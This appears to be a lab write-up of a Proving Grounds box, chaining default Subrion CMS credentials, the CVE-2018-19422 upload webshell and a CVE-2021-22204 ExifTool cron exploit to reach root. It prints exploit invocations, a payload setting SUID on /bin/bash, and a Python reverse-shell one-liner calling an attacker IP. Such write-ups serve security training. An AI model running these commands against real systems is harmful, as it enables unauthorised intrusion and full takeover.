#Linux #SubrionCMS #CVE #FileUpload #RCE #cron #ExifTool #SUIDBinary

## Overview

Exfiltrated is a Linux box running Subrion CMS 4.2.1 behind an `exfiltrated.offsec` virtual host. The CMS admin panel accepts default credentials, and a public exploit (CVE-2018-19422) abuses the authenticated file upload to gain a shell as `www-data`. Privilege escalation comes through a root-owned cron job that runs `exiftool` against uploaded JPEGs every minute. ExifTool at the installed version is vulnerable to CVE-2021-22204, which executes embedded payload code during metadata parsing, used here to set the SUID bit on `/bin/bash` and become root.

## Recon

### Nmap

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 7 disallowed entries
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ /updates/
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
```

Nmap's `robots.txt` parsing hands over the site structure immediately. `/panel/` is the admin interface.

After adding `exfiltrated.offsec` to `/etc/hosts`, the site loads a Subrion CMS instance. Visiting `/panel` shows:

```
Powered by Subrion CMS v4.2.1
```

## Foothold

### Default Credentials on Subrion

The admin panel at `/panel` accepts `admin:admin` on the first try.

> **Why default credentials on CMSes matter:** appliance-style CMSes ship with documented defaults so the first setup isn't locked out. Subrion's documentation lists `admin:admin` as the initial credential. Admins who skip the "change your password" step during setup leave the panel perpetually open. It costs one request to check and is always worth doing before reaching for exploits.

### Authenticated File Upload RCE (CVE-2018-19422)

Subrion 4.2.1 allows uploading `.phar` files through the panel, which Apache executes as PHP. A public exploit automates the process:

```sh
python3 49876.py --user admin --passw admin -u http://exfiltrated.offsec/panel/
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422
[+] Trying to connect to: http://exfiltrated.offsec/panel/
[+] Success!
[+] Got CSRF token: W6FiEazfokseAdzEtvtZmjtDogEXo0yVid2khyuL
[+] Trying to log in...
[+] Login Successful!
[+] Generating random name for Webshell...
[+] Generated webshell name: owfsvlcajygdbpc
[+] Upload Success... Webshell path: http://exfiltrated.offsec/panel/uploads/owfsvlcajygdbpc.phar

$ whoami
www-data
```

A full reverse shell required the Python socket method:

```sh
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.244",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
```

TTY upgrade:

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege Escalation

### Root Cron Job Running ExifTool

LinPEAS surfaces a cron job running every minute as root:

```sh
* * * * *   root    bash /opt/image-exif.sh
```

Contents of `/opt/image-exif.sh`:

```sh
#!/bin/bash
IMAGES='/var/www/html/subrion/uploads'
META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

ls $IMAGES | grep "jpg" | while read filename;
do
    exiftool "$IMAGES/$filename" >> $LOGFILE
done
```

Every minute, root runs `exiftool` against any `.jpg` in the Subrion uploads directory, the same directory where authenticated users can upload files.

> **Why this creates a privesc path:** CVE-2021-22204 lets an attacker embed a shell command inside a specially crafted image file. When ExifTool processes that image, it evaluates the embedded payload as code. Since the cron job runs `exiftool` as root, the payload executes with root privileges. The attacker needs only the ability to write a `.jpg` to the uploads directory, which the Subrion web shell already provides.

### CVE-2021-22204, Malicious Image to SUID /bin/bash

Generate an exploit image that sets the SUID bit on `/bin/bash`:

```sh
python3 exploit-CVE-2021-22204.py -c "chmod +s /bin/bash"

PAYLOAD: (metadata "\c${system('chmod +s /bin/bash')};")
SUCCESS: Exploit image written to "image.jpg"
```

Upload `image.jpg` to `/var/www/html/subrion/uploads/` via the web shell. Within one minute, the cron job fires, ExifTool processes the image, and `/bin/bash` becomes SUID.

## Root

```sh
www-data@exfiltrated:/bin$ /bin/bash -p
bash-5.0# whoami
root
```

```sh
bash-5.0# cat local.txt
‹redacted›

bash-5.0# cat proof.txt
‹redacted›
```

## Takeaways

- **`robots.txt` disallowed entries map the CMS structure.** Nmap parsed it automatically; the `/panel/` path was handed over without any brute force.
- **Default CMS credentials compound the upload vulnerability.** Authentication is supposed to gate CVE-2018-19422, but when admin:admin works, authentication provides no protection at all.
- **Cron jobs that process user-controlled files are root code execution sinks.** Any root process that reads attacker-writable files is a privesc path. The combination of CVE-2021-22204 and a cron/exiftool pattern appears on multiple PG and OSCP boxes.
- **SUID on /bin/bash is an instant root.** `bash -p` runs in privileged mode, inheriting the SUID owner's UID without spawning a new process.
